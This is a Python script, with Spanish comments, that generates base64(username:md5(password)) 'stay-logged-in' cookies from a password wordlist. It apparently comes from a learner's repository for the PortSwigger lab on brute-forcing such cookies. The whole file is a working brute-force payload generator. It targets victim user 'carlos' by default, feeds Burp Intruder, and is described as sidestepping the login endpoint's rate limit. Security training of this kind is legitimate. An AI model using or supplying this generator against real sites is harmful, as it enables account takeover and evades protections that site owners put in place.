from __future__ import annotations

"""
Generador de cookies "stay-logged-in" para fuerza bruta.

Formato de la cookie (PortSwigger, lab "Brute-forcing a stay-logged-in cookie"):

    base64( <username> : md5_hex(<password>) )

Ej.: usuario=wiener, password=peter
     md5("peter") = 51dc30ddc473d43a6011e9ebba6ca770
     "wiener:51dc30ddc473d43a6011e9ebba6ca770"
     base64 -> d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw

ENTRADA : una lista de passwords (una por línea).
          Por defecto resuelve al passwords.txt que ya tenés cargado en
          vulnerabilities/011-brute-force/passwords.txt (sin importar desde
          dónde ejecutes el script). También podés pasarle una ruta absoluta.
SALIDA  : el valor de la cookie (una por línea), listo para pegar como
          payload list en Burp Intruder contra un endpoint autenticado
          (ej. GET /my-account?id=carlos), SIN tocar /login ni su rate limit.

Uso:
    python stay_logged_in_cookies.py                       # user=carlos, passwords por defecto -> stdout
    python stay_logged_in_cookies.py -u carlos             # elegir el username victima
    python stay_logged_in_cookies.py -w C:/ruta/pass.txt   # otra wordlist (ruta absoluta o relativa)
    python stay_logged_in_cookies.py -o cookies.txt        # guardar la salida en un archivo
"""

import argparse
import base64
import hashlib
import sys
from pathlib import Path

# --- Ruta por defecto de la wordlist -------------------------------------
# Resuelta RELATIVA a este script, no al cwd, para que el default funcione
# ejecutes desde donde ejecutes:
#   .../029-authentication/scripts/stay_logged_in_cookies.py
#   -> sube 2 niveles a vulnerabilities/ y baja a 011-brute-force/passwords.txt
SCRIPT_DIR = Path(__file__).resolve().parent
DEFAULT_WORDLIST = SCRIPT_DIR.parent.parent / "011-brute-force" / "passwords.txt"


def cookie_for(username: str, password: str) -> str:
    """Devuelve base64(username:md5_hex(password))."""
    md5_hex = hashlib.md5(password.encode("utf-8")).hexdigest()
    raw = f"{username}:{md5_hex}"
    return base64.b64encode(raw.encode("utf-8")).decode("ascii")


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Genera cookies stay-logged-in base64(user:md5(pass)) a partir de una lista de passwords.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        "-u", "--username",
        default="carlos",
        help="Usuario víctima que va dentro de la cookie.",
    )
    parser.add_argument(
        "-w", "--wordlist",
        type=Path,
        default=DEFAULT_WORDLIST,
        help="Ruta (absoluta o relativa) a la lista de passwords. Por defecto usa el passwords.txt de 011-brute-force.",
    )
    parser.add_argument(
        "-o", "--output",
        type=Path,
        default=None,
        help="Archivo de salida. Si se omite, imprime por stdout.",
    )
    args = parser.parse_args()

    wordlist = args.wordlist.expanduser()
    if not wordlist.is_absolute():
        # una relativa se interpreta respecto al cwd; si no existe, probamos junto al default
        wordlist = wordlist.resolve()

    if not wordlist.is_file():
        print(f"[!] No encuentro la wordlist: {wordlist}", file=sys.stderr)
        print(f"    (default esperado: {DEFAULT_WORDLIST})", file=sys.stderr)
        return 1

    # Leer passwords: una por línea, ignorando vacías y espacios sobrantes.
    with wordlist.open("r", encoding="utf-8", errors="ignore") as fh:
        passwords = [line.strip() for line in fh if line.strip()]

    if not passwords:
        print(f"[!] La wordlist está vacía: {wordlist}", file=sys.stderr)
        return 1

    cookies = [cookie_for(args.username, pw) for pw in passwords]

    if args.output:
        out = args.output.expanduser()
        out.write_text("\n".join(cookies) + "\n", encoding="utf-8")
        print(f"[+] {len(cookies)} cookies para '{args.username}' -> {out}", file=sys.stderr)
        print(f"    wordlist: {wordlist}", file=sys.stderr)
    else:
        # stdout limpio: solo los valores de cookie (pipeable / copiable a Intruder)
        print("\n".join(cookies))

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
